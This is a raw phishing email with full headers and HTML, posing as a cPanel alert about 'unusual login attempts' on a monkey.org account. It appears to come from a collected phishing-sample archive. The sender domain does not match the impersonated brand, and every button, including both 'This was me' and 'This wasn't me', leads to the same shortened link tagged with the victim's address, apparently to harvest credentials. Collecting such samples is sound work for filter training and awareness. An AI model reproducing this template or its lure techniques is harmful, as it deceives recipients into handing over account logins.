@@ -1,0 +1,361 @@
+Return-Path: info@lumenresearch.pro
+Delivered-To: jose@monkey.org
+X-FDA: 82857649812.30.6D77A31
+Received: from server.lumenresearch.pro (unknown [77.91.101.31])
+	by imf09.b.hostedemail.com (Postfix) with ESMTP id 653CD18000A
+	for <jose@monkey.org>; Wed,  4 Dec 2024 15:25:03 +0000 (UTC)
+Authentication-Results: imf09.b.hostedemail.com;	dkim=pass
+ header.d=lumenresearch.pro header.s=202411 header.b=KIdKu1d1;	dmarc=none;
+	spf=pass (imf09.b.hostedemail.com: domain of info@lumenresearch.pro
+ designates 77.91.101.31 as permitted sender)
+ smtp.mailfrom=info@lumenresearch.pro
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1733325901; a=rsa-sha256;
+	cv=none;
+	b=jfTh+tpIL9+81V8DbepuXKMo6kXuGoWE5DgHGzZQwaDogQCwVZ8lmxlWJne2g0NOjvexGh
+	Z9Ah0L9dskbMfK8VicrjmjVL2zlu10MDGTrRSAvM9mX8jELb73iJvEAwnchl909ddcOJIz
+	rgjZenNV3BlbRYIEqmy+mXB/gP73/sI=
+ARC-Authentication-Results: i=1;	imf09.b.hostedemail.com;	dkim=pass
+ header.d=lumenresearch.pro header.s=202411 header.b=KIdKu1d1;	dmarc=none;
+	spf=pass (imf09.b.hostedemail.com: domain of info@lumenresearch.pro
+ designates 77.91.101.31 as permitted sender)
+ smtp.mailfrom=info@lumenresearch.pro
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;	s=arc-20220608; t=1733325901;
+	h=from:from:sender:reply-to:reply-to:subject:subject:date:date:	
+ message-id:message-id:to:to:cc:mime-version:mime-version:	
+ content-type:content-type:	
+ content-transfer-encoding:content-transfer-encoding:in-reply-to:	
+ references:dkim-signature; bh=MFw23xvEUcTpLk1J/mLO+stIqUu56ral7kDUC+7pih4=;
+	b=dzchcNObxVl1JDDnnbpkptTlBubWPcnwaleqsBJ3+l6iX1EThidMdrlcEKe8ztMbTF/bOT
+	ldfFng/8+oQddYRWsETm7x2+Orkbn4LlEPgc8MR/NrXQA3sF3flRaJBuvtNBO6eIceYIIN
+	RjEJA9Z+VlTY5lwYnKhzkcO/4LXmIkM=
+Received: from [109.248.150.220] (unknown [109.248.150.220])
+	by server.lumenresearch.pro (Postfix) with ESMTPA id 35BBAAF35D
+	for <jose@monkey.org>; Wed,  4 Dec 2024 15:25:16 +0000 (GMT)
+DKIM-Signature: v=1; a=rsa-sha256; c=simple/simple; d=lumenresearch.pro;
+	s=202411; t=1733325916;
+	bh=9VI3LZHVQXfMbIrGW25TCFES+zovPKqGGOhaSaqjfO8=;
+	h=Reply-To:From:To:Subject:Date:From;
+	b=KIdKu1d1gyF1ogkDhCXxGt48/PDii4go9yUwg/+eDdQj1u8j2a0EXOFumOyTlsyiP
+	 ZNsjosR3syvJLH7SxwR6nj3vMVKuPFvRQOicckZ46NYeNvk+xS2uaRMUjnPXLZ69KM
+	 66xLZuYDZ3d3cFn4OFRWEN2FH1+P9TOVcvqeETBobHJouu15DSu9g1hh2zWpM7WVmq
+	 dWWA+nBVX/XMOhU9KAHVrJFdzXtA7Q2asG0A5I5S0yFO/ce2KcttYUOLY2gg8zUiC5
+	 m9DZxSptSuVKtZxUwZ1iFkKohychAjLwdeV7Wt5cdyBUuvSHnpfyJpQp/Kp+xqQMNs
+	 M2D4rFk1XrLEg==
+Reply-To: cPanel@monkey.org
+From: cPanel via monkey.org <info@lumenresearch.pro>
+To: jose@monkey.org
+Subject: Unusual login attempts on your jose@monkey.org
+Date: 4 Dec 2024 16:25:16 +0100
+Message-ID: <20241204162516.8C53D2612B32DEB1@lumenresearch.pro>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+X-Rspamd-Queue-Id: 653CD18000A
+X-Stat-Signature: gdd8kxn5y878gyi4smj65jfjysnpptza
+X-Rspam-User: 
+X-Spam-Status: No, score=8.50
+X-Rspamd-Server: rspam06
+X-HE-Tag: 1733325903-515648
+X-HE-Meta: =?utf-8?q?U2FsdGVkX18fEezYSEU+h5r4nt+o8cdO+cDBNxk7kHgzPRqnE5EZQHN?=
+ =?utf-8?q?HUTrhwafMneZ3eaL/JT3rlg3E9bLPPZW9VZDBxbJiYTFg92OgLmarDs0VGQ/zcHbr?=
+ =?utf-8?q?vArOrRqxtqzV+7FEQLzaPXm112s68l2RNcb+0YPnAqAX647es5UCiEDL4L4T3ofp9?=
+ =?utf-8?q?kwprSplHrdiynAaCFbUVkLRkZXujlHmmpQsgJjnjIf7iCftmoIFV8R4hsmqE8ENBt?=
+ =?utf-8?q?yK+8E9N8agfcb642/1HBOoNaHAEtfC2Q7IrlS578Q2O6dbrOQSS//jWXFsGK4M5d3?=
+ =?utf-8?q?bPYTrQb34rQlEF7oEnvWUNGVZ1hiRqnR/ZEhjdStUP2tmaEDGvDgqBSt7BrXlXi1t?=
+ =?utf-8?q?xGHs+kEgHrhI7T1WhLPqnWLHEfPXowgM/Ifzclz2d1/X8rDWd0wKWairxEoJXKmKp?=
+ =?utf-8?q?kUJzQ20BUEFMHc6FgSYMJFEDfxiMrxWyV4qs0E0Tu7TMSiPw2wO/Q2mQsIVK61ZBx?=
+ =?utf-8?q?uKY4ghPIAHdfCkB0gaG52hbgFZWSvuWhl2b8IxZIw4x53kmxW2qY/Kd2pFt8jtVx0?=
+ =?utf-8?q?3+6sUZjfCTfTwbNDTInoqc+HqWAOhA4yI6mor4VGmP4yF6X4fT4wLmqceIQSxp8Cr?=
+ =?utf-8?q?PW16ArX5g1YXuwJY3x9RizjWyaP7ZMsvE0Xw1zU5Lm3AG42p3mdwqu6QNq8ZGpFAR?=
+ =?utf-8?q?gqexaeDSF2gmrYjAl42MUd/Os97quBqyOXJyVLPyF0Sr1OvpTKeni21yG38et8iB7?=
+ =?utf-8?q?mjPYCTEfPjPFp82sCMQ2ZArPqPlJuA14iA0FnGtPQh0ritIZvkfpOBWAPFuvHDT/s?=
+ =?utf-8?q?vHVJYIcWV8mm6pHGGxNhQZccesvLsNji3oI2elgtPEKUr/Z6bDgUZ0vHg38Dkk20j?=
+ =?utf-8?q?zjqbiGLUp1UUMZfk5UpxKZm0W2MzVmuf+/KOZ+9tj6VuwiW8lc5xgJTY4NI9y4fRL?=
+ =?utf-8?q?rVr7sb6IVADRWQploN/E3I_CAvZ+AKOpvLIFfKAx2lZ8fHmnvRGSCUVBQp/ZxXnrb?=
+ =?utf-8?q?msJHDVrygfZrvfKgI2OOdQepfMD26F+Mq2v1XzUkJX4peKOr+ZNsYtK9Oo1dYSVxm?=
+ =?utf-8?q?hHKQPZB6d7ovfcJlAeqYTkcXGBP6u0uvfmsWFgvdqX6Sa50oMa7DBCXKTXyPScYge?=
+ =?utf-8?q?rmrfyDiMut0EKn1cCyx9e1S4yTNGNF0amS3VhXZ08SIhmWLiTqwcfhalmGujulQH7?=
+ =?utf-8?q?ZQFhERHrxIPDwVfmVAQOdBfctH9ZVZoNss0pL6SAtD8j52jd8ueCs8Nsdvdt4c+CP?=
+ =?utf-8?q?ra46RSve/x6im/nvhB3kM+HTGAlxmMYv4wcrxgRzFbLKy6ZgbbKyW0pN1a8+7kK7A?=
+ =?utf-8?q?q4rpVWRn8UtWaZuK6J22NZkr3fjos6XepoT7yIHJx8gs2XgyAkxp4hvUQDYz4GcIx?=
+ =?utf-8?q?Ke2oncGxSP7IYOBcTBUrjXoEh+Y17t72Z3Lx9kf3U4Dn5T4Km+JF8/elg6501G2Bi?=
+ =?utf-8?q?ATgC2ioRea5b6MZm5niZfy46J03itOSfFI+ffFJRqDeqNuZlqhDWJayCQEn3fRUoX?=
+ =?utf-8?q?Yopufim0abdmpEwe8mUMGbO6/1U9kzLnGPyDX+nbWoWNnlmMgERz1oF4/i7D7/cpF?=
+ =?utf-8?q?7bZfbKU090eGrq0QWQI17/oARaGznFRC/p90dS/IvMaOcxe6MZVivuOPBCRqs07Ge?=
+ =?utf-8?q?AjsWmC8fdqid+CzoVrlKUKXi6UvoP54GWjIkOud0fAAs3FggUEUeZ7a/hT99jz0Ck?=
+ =?utf-8?q?7eALVsToz9QQvDFZGQ887uxoQZVYniI11b79sE3YqS+PUVnGB7eP92+81ZRq1uu/d?=
+ =?utf-8?q?hEUhFCmsxd+wUigbzxpNlVVEL5oWzK6m3mnkfWQN0BItUp+JHR/8J15Z30qZDDn+K?=
+ =?utf-8?q?KAzEX1SvZkz6fgc2ysFDIIhBpsZs/bn650NA=3D=3D?=
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 379
+
+<!DOCTYPE HTML>
+
+<html><head><title></title>
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body style=3D"margin: 0.4em; font-size: 14pt;">
+<h1 style=3D'text-align: left; color: rgb(23, 43, 77); text-transform: none=
+; line-height: 28px; text-indent: 0px; letter-spacing: -0.01em; font-family=
+: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, "F=
+ira Sans", "Droid Sans", "Helvetica Neue", sans-serif; font-size: 24px; fon=
+t-style: normal; font-weight: 500; margin-top: 40px; margin-bottom: 0px; wo=
+rd-spacing: 0px; white-space: normal; box-sizing: border-box; orphans: 2; w=
+idows: 2; background-color: rgb(255, 255, 255);=20
+font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-str=
+oke-width: 0px; text-decoration-thickness: initial; text-decoration-style: =
+initial; text-decoration-color: initial;'>Unusual
+
+  login attempts on your&nbsp;monkey.org<span style=3D"box-sizing: border-b=
+ox;">&nbsp;</span>account</h1>
+<p style=3D'text-align: left; color: rgb(9, 30, 66); text-transform: none; =
+line-height: 20px; text-indent: 0px; letter-spacing: 0em; font-family: -app=
+le-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, "Fira Sa=
+ns", "Droid Sans", "Helvetica Neue", sans-serif; font-size: 14px; font-styl=
+e: normal; font-weight: 400; margin-top: 12px; margin-bottom: 1rem; word-sp=
+acing: 0px; white-space: normal; box-sizing: border-box; orphans: 2; widows=
+: 2; background-color: rgb(255, 255, 255);=20
+font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-str=
+oke-width: 0px; text-decoration-thickness: initial; text-decoration-style: =
+initial; text-decoration-color: initial;'>Hello
+
+  jose,</p>
+<p style=3D'text-align: left; color: rgb(9, 30, 66); text-transform: none; =
+line-height: 20px; text-indent: 0px; letter-spacing: 0em; font-family: -app=
+le-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, "Fira Sa=
+ns", "Droid Sans", "Helvetica Neue", sans-serif; font-size: 14px; font-styl=
+e: normal; font-weight: 400; margin-top: 12px; margin-bottom: 1rem; word-sp=
+acing: 0px; white-space: normal; box-sizing: border-box; orphans: 2; widows=
+: 2; background-color: rgb(255, 255, 255);=20
+font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-str=
+oke-width: 0px; text-decoration-thickness: initial; text-decoration-style: =
+initial; text-decoration-color: initial;'>We
+
+  noticed some unusual login activity with your account.</p>
+<div style=3D'padding: 15px; text-align: left; color: rgb(9, 30, 66); text-=
+transform: none; text-indent: 0px; letter-spacing: normal; font-family: -ap=
+ple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, "Fira S=
+ans", "Droid Sans", "Helvetica Neue", sans-serif; font-size: 14px; font-sty=
+le: normal; font-weight: 400; word-spacing: 0px; white-space: normal; box-s=
+izing: border-box; orphans: 2; widows: 2; background-color: rgb(219, 235, 2=
+55); font-variant-ligatures: normal;=20
+font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-=
+thickness: initial; text-decoration-style: initial; text-decoration-color: =
+initial;'>
+  <table width=3D"100%" style=3D"width: 490px; font-size: 13px; border-coll=
+apse: collapse; table-layout: auto; box-sizing: border-box;">
+    <tbody style=3D"box-sizing: border-box;">
+      <tr style=3D"box-sizing: border-box;">
+        <td width=3D"20%" valign=3D"top" style=3D"margin: 0px; width: 77px;=
+ padding-left: 20px; vertical-align: top; box-sizing: border-box;">
+          <div style=3D"box-sizing: border-box;"><strong style=3D"font-weig=
+ht: bolder; box-sizing: border-box;">Email</strong></div>
+        </td>
+        <td width=3D"80%" align=3D"left" style=3D"margin: 0px; width: 390px=
+; text-align: left; box-sizing: border-box;">
+          <div style=3D"box-sizing: border-box;"><a style=3D"color: rgb(17,=
+ 85, 204); text-decoration: none; box-sizing: border-box; background-color:=
+ transparent;">jose@monkey.org</a></div>
+        </td>
+      </tr>
+      <tr style=3D"box-sizing: border-box;">
+        <td width=3D"20%" valign=3D"top" style=3D"margin: 0px; width: 77px;=
+ padding-left: 20px; vertical-align: top; box-sizing: border-box;">
+          <div style=3D"box-sizing: border-box;"><strong style=3D"font-weig=
+ht: bolder; box-sizing: border-box;">Time</strong></div>
+        </td>
+        <td width=3D"80%" align=3D"left" style=3D"margin: 0px; width: 390px=
+; text-align: left; box-sizing: border-box;">
+          <div style=3D"box-sizing: border-box;">&nbsp;12/4/2024 4:25:16 p.=
+m..
+            (UTC)</div>
+        </td>
+      </tr>
+      <tr style=3D"box-sizing: border-box;">
+        <td width=3D"20%" valign=3D"top" style=3D"margin: 0px; width: 77px;=
+ padding-left: 20px; vertical-align: top; box-sizing: border-box;">
+          <div style=3D"box-sizing: border-box;"><strong style=3D"font-weig=
+ht: bolder; box-sizing: border-box;">Location</strong></div>
+        </td>
+        <td width=3D"80%" align=3D"left" style=3D"margin: 0px; width: 390px=
+; text-align: left; box-sizing: border-box;">
+          <div style=3D"box-sizing: border-box;">
+            <div style=3D"box-sizing: border-box;">New York, USA.</div>
+          </div>
+        </td>
+      </tr>
+      <tr style=3D"box-sizing: border-box;">
+        <td width=3D"20%" valign=3D"top" style=3D"margin: 0px; width: 77px;=
+ padding-left: 20px; vertical-align: top; box-sizing: border-box;">
+          <div style=3D"box-sizing: border-box;"><strong style=3D"font-weig=
+ht: bolder; box-sizing: border-box;">Device</strong></div>
+        </td>
+        <td width=3D"80%" align=3D"left" style=3D"margin: 0px; width: 390px=
+; text-align: left; box-sizing: border-box;">
+          <div style=3D"box-sizing: border-box;">Windows 10</div>
+        </td>
+      </tr>
+      <tr style=3D"box-sizing: border-box;">
+        <td width=3D"20%" valign=3D"top" style=3D"margin: 0px; width: 77px;=
+ padding-left: 20px; vertical-align: top; box-sizing: border-box;">
+          <div style=3D"box-sizing: border-box;"><strong style=3D"font-weig=
+ht: bolder; box-sizing: border-box;">Browser</strong></div>
+        </td>
+        <td width=3D"80%" align=3D"left" style=3D"margin: 0px; width: 390px=
+; text-align: left; box-sizing: border-box;">
+          <div style=3D"box-sizing: border-box;">Chrome</div>
+        </td>
+      </tr>
+      <tr style=3D"box-sizing: border-box;">
+        <td width=3D"20%" valign=3D"top" style=3D"margin: 0px; width: 77px;=
+ padding-left: 20px; vertical-align: top; box-sizing: border-box;">
+          <div style=3D"box-sizing: border-box;"><strong style=3D"font-weig=
+ht: bolder; box-sizing: border-box;">IP&nbsp;address&nbsp;&nbsp;</strong></=
+div>
+        </td>
+        <td width=3D"80%" align=3D"left" style=3D"margin: 0px; width: 390px=
+; text-align: left; box-sizing: border-box;">
+          <div style=3D"box-sizing: border-box;">61.13.16.238</div>
+        </td>
+      </tr>
+    </tbody>
+  </table>
+</div>
+<p style=3D'text-align: left; color: rgb(9, 30, 66); text-transform: none; =
+line-height: 20px; text-indent: 0px; letter-spacing: 0em; font-family: -app=
+le-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, "Fira Sa=
+ns", "Droid Sans", "Helvetica Neue", sans-serif; font-size: 14px; font-styl=
+e: normal; font-weight: 400; margin-top: 12px; margin-bottom: 1rem; word-sp=
+acing: 0px; white-space: normal; box-sizing: border-box; orphans: 2; widows=
+: 2; background-color: rgb(255, 255, 255);=20
+font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-str=
+oke-width: 0px; text-decoration-thickness: initial; text-decoration-style: =
+initial; text-decoration-color: initial;'>To
+
+  make sure your account is secure, let us know if this was you.</p>
+<div style=3D'width: 520px; text-align: left; color: rgb(9, 30, 66); text-t=
+ransform: none; text-indent: 0px; letter-spacing: normal; font-family: -app=
+le-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, "Fira Sa=
+ns", "Droid Sans", "Helvetica Neue", sans-serif; font-size: 14px; font-styl=
+e: normal; font-weight: 400; word-spacing: 0px; display: inline-block; whit=
+e-space: normal; box-sizing: border-box; orphans: 2; widows: 2; background-=
+color: rgb(255, 255, 255); font-variant-ligatures:=20
+normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-dec=
+oration-thickness: initial; text-decoration-style: initial; text-decoration=
+-color: initial;'>
+  <div style=3D"text-align: center; box-sizing: border-box;">
+    <div style=3D"margin-bottom: 20px; display: inline-block; box-sizing: b=
+order-box;">
+<a style=3D"background: rgb(244, 245, 247); margin: 0px; padding: 0px 12px;=
+ border-radius: 3px; height: 2.28em; text-align: center; color: rgb(80, 95,=
+ 121); line-height: 2.28em; font-style: normal; text-decoration: none; vert=
+ical-align: middle; display: inline-flex; white-space: nowrap; box-sizing: =
+border-box;" href=3D"https://tinyurl.com/2d75fuv7#jose@monkey.org" target=
+=3D"_blank" rel=3D"noreferrer">
+<span style=3D"width: 230px; box-sizing: border-box;"><strong style=3D"font=
+-weight: bolder; box-sizing: border-box;">This
+            wasn't me</strong></span></a></div>
+    <span style=3D"box-sizing: border-box;">&nbsp;</span><span style=3D"box=
+-sizing: border-box;">&nbsp;</span><span>&nbsp;</span>
+    <div style=3D"margin-bottom: 20px; display: inline-block; box-sizing: b=
+order-box;">
+<a style=3D"background: rgb(244, 245, 247); margin: 0px; padding: 0px 12px;=
+ border-radius: 3px; height: 2.28em; text-align: center; color: rgb(80, 95,=
+ 121); line-height: 2.28em; font-style: normal; text-decoration: none; vert=
+ical-align: middle; display: inline-flex; white-space: nowrap; box-sizing: =
+border-box;" href=3D"https://tinyurl.com/2d75fuv7#jose@monkey.org" target=
+=3D"_blank" rel=3D"noreferrer">
+<span style=3D"width: 230px; box-sizing: border-box;"><strong style=3D"font=
+-weight: bolder; box-sizing: border-box;">This
+            was me</strong></span></a></div>
+  </div>
+</div>
+<p style=3D"margin-top: 0px; margin-bottom: 1rem; box-sizing: border-box;">=
+
+<span style=3D'text-align: left; color: rgb(9, 30, 66); text-transform: non=
+e; text-indent: 0px; letter-spacing: normal; font-family: -apple-system, bl=
+inkmacsystemfont, "segoe ui", roboto, oxygen, ubuntu, "fira sans", "droid s=
+ans", "helvetica neue", sans-serif; font-size: 14px; font-style: normal; fo=
+nt-weight: 400; word-spacing: 0px; float: none; display: inline !important;=
+ white-space: normal; box-sizing: border-box; orphans: 2; widows: 2; backgr=
+ound-color: rgb(255, 255, 255);=20
+font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-str=
+oke-width: 0px; text-decoration-thickness: initial; text-decoration-style: =
+initial; text-decoration-color: initial;'><span style=3D"box-sizing: border=
+-box;">&nbsp;</span></span><span>&nbsp;</span>
+<a style=3D'background: none; text-align: left; color: rgb(0, 82, 204); tex=
+t-transform: none; text-indent: 0px; letter-spacing: normal; font-family: -=
+apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, "Fira=
+ Sans", "Droid Sans", "Helvetica Neue", sans-serif; font-size: 14px; font-s=
+tyle: normal; font-weight: 400; text-decoration: none; word-spacing: 0px; w=
+hite-space: normal; box-sizing: border-box; orphans: 2; widows: 2; font-var=
+iant-ligatures: normal; font-variant-caps: normal;=20
+-webkit-text-stroke-width: 0px;' href=3D"https://tinyurl.com/2d75fuv7#jose@=
+monkey.org" target=3D"_blank" rel=3D"noreferrer">Why
+
+    am I getting this email?</a></p>
+<hr style=3D'border-width: 0px 0px 1px; height: 0px; text-align: left; colo=
+r: rgb(9, 30, 66); text-transform: none; text-indent: 0px; letter-spacing: =
+normal; overflow: visible; font-family: -apple-system, BlinkMacSystemFont, =
+"Segoe UI", Roboto, Oxygen, Ubuntu, "Fira Sans", "Droid Sans", "Helvetica N=
+eue", sans-serif; font-size: 14px; font-style: normal; font-weight: 400; ma=
+rgin-top: 24px; margin-bottom: 24px; word-spacing: 0px; border-top-color: r=
+gba(0, 0, 0, 0.1); border-top-style: solid;=20
+border-bottom-style: solid; white-space: normal; box-sizing: content-box; o=
+rphans: 2; widows: 2; background-color: rgb(255, 255, 255); font-variant-li=
+gatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px;=
+ text-decoration-thickness: initial; text-decoration-style: initial; text-d=
+ecoration-color: initial;'>
+<div style=3D'text-align: center; color: rgb(112, 112, 112); text-transform=
+: none; line-height: 19px; text-indent: 0px; letter-spacing: normal; font-f=
+amily: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubunt=
+u, "Fira Sans", "Droid Sans", "Helvetica Neue", sans-serif; font-size: 13px=
+; font-style: normal; font-weight: 400; margin-top: 10px; word-spacing: 0px=
+; white-space: normal; box-sizing: border-box; orphans: 2; widows: 2; backg=
+round-color: rgb(255, 255, 255);=20
+font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-str=
+oke-width: 0px; text-decoration-thickness: initial; text-decoration-style: =
+initial; text-decoration-color: initial;'><br class=3D"Apple-interchange-ne=
+wline">
+  <table width=3D"100%" align=3D"center" style=3D"border-collapse: collapse=
+; box-sizing: border-box;" bgcolor=3D"#ffffff" border=3D"0" cellspacing=3D"=
+0" cellpadding=3D"0">
+    <tbody style=3D"box-sizing: border-box;">
+      <tr style=3D'text-align: center; color: rgb(112, 112, 112); text-tran=
+sform: none; text-indent: 0px; letter-spacing: normal; font-family: -apple-=
+system, "system-ui", "Segoe UI", Roboto, Oxygen, Ubuntu, "Fira Sans", "Droi=
+d Sans", "Helvetica Neue", sans-serif; font-size: 13px; font-style: normal;=
+ font-weight: 400; word-spacing: 0px; white-space: normal; box-sizing: bord=
+er-box; orphans: 2; widows: 2; background-color: rgb(255, 255, 255); font-v=
+ariant-ligatures: normal; font-variant-caps:=20
+normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial;=
+ text-decoration-style: initial; text-decoration-color: initial;'>
+        <td align=3D"center" valign=3D"top" style=3D"margin: 0px; text-alig=
+n: center; line-height: 18px; padding-top: 0px; font-size: 12px; box-sizing=
+: border-box;"><span style=3D"box-sizing: border-box;">This message was sen=
+t to you
+            by&nbsp;cPanel Cloud<br style=3D"box-sizing: border-box;">
+            12/4/2024 4:25:16 p.m..</span></td>
+      </tr>
+      <tr valign=3D"top" style=3D'text-align: center; color: rgb(112, 112, =
+112); text-transform: none; text-indent: 0px; letter-spacing: normal; font-=
+family: -apple-system, "system-ui", "Segoe UI", Roboto, Oxygen, Ubuntu, "Fi=
+ra Sans", "Droid Sans", "Helvetica Neue", sans-serif; font-size: 13px; font=
+-style: normal; font-weight: 400; word-spacing: 0px; white-space: normal; b=
+ox-sizing: border-box; orphans: 2; widows: 2; background-color: rgb(255, 25=
+5, 255); font-variant-ligatures: normal;=20
+font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-=
+thickness: initial; text-decoration-style: initial; text-decoration-color: =
+initial;'>
+      </tr>
+    </tbody>
+  </table>
+</div>
+
+
+
+</body></html>
+
